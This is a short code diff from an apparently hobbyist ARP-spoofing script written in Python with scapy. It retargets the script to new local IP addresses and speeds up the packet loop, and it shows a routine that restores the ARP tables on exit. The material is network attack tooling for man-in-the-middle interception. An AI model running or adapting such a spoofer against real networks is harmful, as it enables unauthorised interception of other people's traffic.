@@ -30,8 +30,8 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "192.168.10.143"
-gateway_ip = "192.168.10.1"
+target_ip = "192.168.10.234"
+gateway_ip = "192.168.10.254"
 
 send_packets_count = 0
 try:
@@ -43,7 +43,7 @@ try:
         print("\r[+] Packets send : " + str(send_packets_count)),
         # print("\r[+] Packets send : " + str(send_packets_count), end="")  ==> Python3
         sys.stdout.flush()
-        time.sleep(2)
+        time.sleep(0.5)
 except KeyboardInterrupt:
     print("\r\n[-] Detected CTRL + C ......Resetting ARP tables ......Please wait.\n")
     restore(gateway_ip, target_ip)
